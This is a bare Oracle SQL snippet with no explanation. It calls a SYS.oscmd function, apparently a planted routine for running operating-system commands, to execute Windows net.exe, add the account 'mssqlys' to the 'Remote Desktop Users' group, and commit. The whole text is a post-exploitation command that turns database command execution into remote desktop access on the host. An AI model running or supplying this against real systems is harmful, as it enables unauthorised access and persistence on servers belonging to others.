SELECT SYS.oscmd ('C:\Windows\System32\net.exe localgroup "Remote Desktop Users" mssqlys /add') from dual;
COMMIT;
